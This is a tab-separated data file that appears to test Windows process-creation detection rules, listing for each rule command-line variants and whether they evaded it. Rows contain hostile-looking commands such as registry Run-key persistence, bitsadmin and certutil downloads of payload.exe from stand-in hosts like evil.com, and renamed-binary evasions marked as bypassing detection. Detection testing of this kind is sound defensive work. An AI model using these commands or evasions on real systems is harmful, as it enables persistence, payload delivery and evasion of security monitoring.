Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70	"REG  ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Persistence\"" /t REG_SZ /F /D \""payload.exe\"""	"REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Persistence"" /t REG_SZ /F /D ""payload.exe"""	TRUE	FALSE	FALSE	Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70); Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70	"reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d ""payload.exe"" /f"	"cmd.exe /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d ""payload.exe"" /f"	TRUE	FALSE	FALSE	Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70); Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"copy reg.exe not_reg.exe && not_reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d ""payload.exe"""	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70	"reg   add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d \""C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\"" /f"	"reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d ""C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe"" /f"	TRUE	FALSE	FALSE	Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70); Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70	"REG   ADD \""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\"""	"REG  ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\\Path\\AtomicRedTeam.exe"""	TRUE	FALSE	FALSE	Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70); Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70	"REG    ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d \""C:\\Path\\AtomicRedTeam.dll\"""	"REG   ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\\Path\\AtomicRedTeam.dll"""	TRUE	FALSE	FALSE	Potential Persistence Attempt Via Run Keys Using Reg.EXE (de587dce-915e-4218-aac4-835ca6af6f70); Direct Autorun Keys Modification (24357373-078f-44ed-9ac4-6d334a668a11)
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		"bash.exe -c ""whoami"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		bash.exe -c'whoami'	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		bash.exe -c whoami	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		"bash.exe -c""whoami"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		"bash.exe -c ""whoami"" --"	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe     -- script.sh	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe -l script.sh	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe script.sh # bash -	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe script.sh	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539	"cmd.exe /c ""conhost.exe 0xffffffff -ForceV1"""	conhost.exe 0xffffffff -ForceV1	TRUE	FALSE	FALSE	Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		"""conhost.exe"" 0xffffffff -ForceV1"	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539	"cmd.exe /c ""conhost.exe 0xFFFFFFFF -forcev1"""	conhost.exe 0xFFFFFFFF -forcev1	TRUE	FALSE	FALSE	Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539	"cmd.exe /c ""C:\Windows\System32\conhost.exe 0xffffffff -ForceV1"""	C:\Windows\System32\conhost.exe 0xffffffff -ForceV1	TRUE	FALSE	FALSE	Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539	"cmd.exe /c ""conhost.exe 0xffffffff -ForceV1 -ForceV1"""	conhost.exe 0xffffffff -ForceV1 -ForceV1	TRUE	FALSE	FALSE	Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1202	proc_creation_win_msdt_susp_cab_options	Suspicious Cabinet File Execution Via Msdt.EXE	dc4576d4-7467-424f-9eee-fd2b02855fe0		copy msdt.exe diagnostic_tool.exe && diagnostic_tool.exe -cab C:\Temp\Suspicious.diagcab	FALSE	FALSE	FALSE	
t1202	proc_creation_win_office_arbitrary_cli_download	Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		"EXCEL.EXE ""http://malicious-domain.com/payload.csv"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_office_arbitrary_cli_download	Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		"POWERPNT.EXE ""https://malicious-domain.com/share/payload.pptx"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_office_arbitrary_cli_download	Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		WINWORD.EXE \\evil-server.local\share\payload.docx	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -S MYSERVER -d MyDB"	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp  ""SELECT * FROM dbo.SecretTable""  queryout  C:\temp\export.txt  -c  -T  -S MYSERVER  -d MyDB"	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -d MyDB -S MYSERVER"	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -S""MYSERVER"" -d""MyDB"""	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		"C:\Windows\System32\bitsadmin.exe"" /transfer MyJob /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede	bitsadmin.exe  /addfile MyJob https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	bitsadmin.exe /addfile MyJob https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede	bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede	bitsadmin.exe  /transfer MyJob http://example.com/payload.exe payload.exe	bitsadmin.exe /transfer MyJob http://example.com/payload.exe payload.exe	TRUE	FALSE	FALSE	File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede)
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		copy bitsadmin.exe not_bits.exe && not_bits.exe /transfer MyJob http://example.com/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef	bitsadmin  /transfer MyJob http://10.10.10.10/payload.exe payload.exe	bitsadmin /transfer MyJob http://10.10.10.10/payload.exe payload.exe	TRUE	FALSE	FALSE	Suspicious Download From Direct IP Via Bitsadmin (99c840f2-2012-46fd-9141-c761987550ef); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede)
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef	bitsadmin.exe   /transfer   MyJob   http://10.10.10.10/payload.exe   payload.exe	bitsadmin.exe  /transfer   MyJob   http://10.10.10.10/payload.exe   payload.exe	TRUE	FALSE	FALSE	Suspicious Download From Direct IP Via Bitsadmin (99c840f2-2012-46fd-9141-c761987550ef); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede)
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef	bitsadmin.exe  /transfer MyJob http://10.10.10.10/payload.exe .\payload.exe	bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe .\payload.exe	TRUE	FALSE	FALSE	Suspicious Download From Direct IP Via Bitsadmin (99c840f2-2012-46fd-9141-c761987550ef); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede)
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef	bitsadmin.exe  /transfer MyJob http://10.10.10.10/payload.exe payload.exe	bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe payload.exe	TRUE	FALSE	FALSE	Suspicious Download From Direct IP Via Bitsadmin (99c840f2-2012-46fd-9141-c761987550ef); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede)
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c	"C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"" C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt"	"C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"" C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt"	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c	bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c	bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c		certutil -urlcache -split -f http://anonfiles.com/example/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_susp_extensions	File With Suspicious Extension Downloaded Via Bitsadmin	5b80a791-ad9b-4b75-bcc1-ad4e1e89c200	C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac	"C:\Windows\System32\bitsadmin.exe  /transfer job1 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt \""C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt\"""	"C:\Windows\System32\bitsadmin.exe /transfer job1 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt ""%TEMP%\Atomic-license.txt"""	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac	"bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md \""C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1\"""	"bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md ""%USERPROFILE%\AppData\Local\Temp\bitsadmin3_flag.ps1"""	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac	bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac		bitsadmin /transfer myJob /download /priority high http://evil.com/payload.exe payload.exe	TRUE	TRUE	FALSE	File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede)
t1197	proc_creation_win_bitsadmin_download_uncommon_targetfolder	File Download Via Bitsadmin To An Uncommon Target Folder	6e30c82f-a9f8-4aab-b79c-7c12bce6f248	C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_uncommon_targetfolder	File Download Via Bitsadmin To An Uncommon Target Folder	6e30c82f-a9f8-4aab-b79c-7c12bce6f248	bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_download_uncommon_targetfolder	File Download Via Bitsadmin To An Uncommon Target Folder	6e30c82f-a9f8-4aab-b79c-7c12bce6f248	"bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt \""C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt\"""	"bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt ""%temp%\Atomic-license.txt"""	TRUE	FALSE	FALSE	Suspicious Download From File-Sharing Website Via Bitsadmin (8518ed3d-f7c9-4601-a26c-f361a4256a0c); File With Suspicious Extension Downloaded Via Bitsadmin (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200); File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); File Download Via Bitsadmin To An Uncommon Target Folder (6e30c82f-a9f8-4aab-b79c-7c12bce6f248)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /AddFile myjob payload.exe payload.exe	TRUE	TRUE	TRUE	
